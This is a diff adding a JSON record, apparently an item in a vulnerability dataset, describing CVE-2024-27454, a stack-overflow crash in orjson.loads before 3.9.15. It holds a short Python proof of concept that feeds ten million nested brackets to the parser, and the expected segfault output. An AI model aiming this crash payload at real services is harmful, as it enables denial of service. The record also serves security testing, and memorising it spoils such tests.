@@ -1,0 +1,15 @@
+{
+  "file_id": "127_orjson_issue_458",
+  "numeric_id": "127",
+  "library_hint": "orjson",
+  "source": "github_issue",
+  "title": "Unbounded recursion during deserialization in orjson leads to stack overflow and segmentation fault",
+  "cve": "CVE-2024-27454",
+  "cwe": "CWE-400: Uncontrolled Resource Consumption",
+  "library": "orjson",
+  "affected_version": "< 3.9.15",
+  "vulnerable_function": "orjson.loads",
+  "triggerability": "indirect",
+  "trigger_payload": "import json\nimport orjson\nnested = b\"[\"*10000000 + b\"]\"*10000000\ntry:\n    json.loads(nested)\nexcept RecursionError:\n    print(\"RecursionError\") # handled gracefully\ntry:\n    orjson.loads(nested) # Segmentation fault (core dumped)\nexcept RecursionError:\n    print(\"RecursionError\")",
+  "oracle": "Segmentation fault (core dumped)"
+}
